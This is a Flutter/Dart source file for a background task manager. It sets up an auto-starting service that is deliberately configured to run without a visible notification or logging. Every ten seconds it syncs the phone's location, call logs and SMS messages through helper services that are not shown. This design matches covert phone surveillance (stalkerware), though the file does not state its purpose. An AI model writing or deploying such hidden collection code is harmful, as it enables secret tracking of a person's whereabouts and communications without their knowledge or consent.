import 'dart:async';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'call_log_service.dart';
import 'location_service.dart';
import 'sms_service.dart';

class BackgroundTaskManager {
  // Initialize the background service configuration
  static Future<void> initialize() async {
    final service = FlutterBackgroundService();

    // Configure the background service without notifications or logging
    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: _onStart, // Will be called when the service starts
        autoStart: true, // Start automatically
        isForegroundMode: false, // Don't run the service in the foreground (no notification)
        notificationChannelId: 'my_foreground', // This won't be used
      ),
      iosConfiguration: IosConfiguration(
        autoStart: true,
        onForeground: _onStart, // Will be called when the app is in the foreground
        onBackground: _onIosBackground, // Will be called when the app goes to the background
      ),
    );
  }

  // This method will be executed when the service starts
  static Future<void> _onStart(ServiceInstance service) async {
    DartPluginRegistrant.ensureInitialized();

    // Perform background tasks periodically
    Timer.periodic(const Duration(seconds: 10), (timer) async {
      // Sync location, call logs, and SMS logs
      await LocationService.syncLocation();
      await CallLogService.syncCallLogs();
      await SmsService.syncSmsLogs();
    });
  }

  // This method will be executed when the app goes to the background (iOS)
  @pragma('vm:entry-point')
  static Future<bool> _onIosBackground(ServiceInstance service) async {
    WidgetsFlutterBinding.ensureInitialized();
    DartPluginRegistrant.ensureInitialized();

    return true;
  }
}
